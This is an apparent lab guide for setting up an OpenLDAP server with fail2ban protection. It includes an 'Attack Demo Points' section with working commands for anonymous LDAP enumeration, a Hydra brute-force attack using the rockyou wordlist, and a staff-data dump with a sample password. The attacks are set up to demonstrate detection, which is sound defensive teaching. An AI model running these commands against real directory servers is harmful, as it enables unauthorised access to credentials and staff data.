# LDAP Server Setup — company-ldap-server (10.20.20.20)

**VM IP:** 10.20.20.20 (Internal — VLAN 20)  
**Domain:** `goldenmyanmar.trading.com`  
**Base DN:** `dc=goldenmyanmar,dc=com`

---

## Install + Configure

```bash
# Install
sudo apt update
sudo apt install slapd ldap-utils fail2ban -y
# slapd     : OpenLDAP server daemon
# ldap-utils: ldapsearch, ldapadd tools

# Configure (interactive)
sudo dpkg-reconfigure slapd
# → Omit OpenLDAP server configuration: No
# → DNS domain name: goldenmyanmar.trading.com
# → Organization name: Golden Myanmar Trading
# → Administrator password: (set strong password)
# → Database backend: MDB
# → Do you want the database to be removed when slapd is purged? No
# → Move old database? Yes

sudo systemctl enable --now slapd
sudo systemctl enable --now fail2ban

# Verify base structure
ldapsearch -x -H ldap://localhost -b "dc=goldenmyanmar,dc=com"
```

---

## Load Staff Accounts

```bash
# Load OUs + staff entries from setup.ldif
ldapadd -x -H ldap://localhost \
  -D "cn=admin,dc=goldenmyanmar,dc=com" \
  -W -f lab/ldap-server/setup.ldif

# Verify
ldapsearch -x -H ldap://localhost \
  -b "dc=goldenmyanmar,dc=com" \
  -D "cn=admin,dc=goldenmyanmar,dc=com" \
  -W "(objectClass=inetOrgPerson)" cn mail
```

---

## Attack Demo Points

### 1 — Anonymous Bind (Information Disclosure)
```bash
# From Kali — enumerate all entries without credentials
ldapsearch -x -H ldap://10.20.20.20 -b "dc=goldenmyanmar,dc=com"
# Exposes: all usernames, emails, OUs
# AEGIS: ldap_auth_failure / forwarder watches syslog
```

### 2 — Credential Brute Force
```bash
# Hydra LDAP brute force
hydra -l "cn=teller01,ou=staff,dc=goldenmyanmar,dc=com" \
      -P /usr/share/wordlists/rockyou.txt \
      ldap2://10.20.20.20
# Fail2ban: detects repeated bind failures → bans IP
# AEGIS: fail2ban event → auto-block + Telegram
```

### 3 — Valid Credential Dump
```bash
# After finding valid credentials — dump all staff
ldapsearch -x -H ldap://10.20.20.20 \
  -b "ou=staff,dc=goldenmyanmar,dc=com" \
  -D "cn=teller01,ou=staff,dc=goldenmyanmar,dc=com" \
  -w "teller@123" "(objectClass=inetOrgPerson)"
# Dumps: all staff names, emails, descriptions
```

---

## Fail2ban — LDAP Protection

Add to `/etc/fail2ban/jail.local` on this VM:

```ini
[slapd]
enabled  = true
port     = 389,636
filter   = slapd
logpath  = /var/log/syslog
maxretry = 5
bantime  = 3600
```

Create `/etc/fail2ban/filter.d/slapd.conf`:
```ini
[Definition]
failregex = slapd\[\d+\]: conn=\d+ fd=\d+ ACCEPT from IP=<HOST>
            slapd\[\d+\]: conn=\d+ op=\d+ BIND dn=.* method=128 fail
ignoreregex =
```

```bash
sudo systemctl restart fail2ban
sudo fail2ban-client status slapd
```
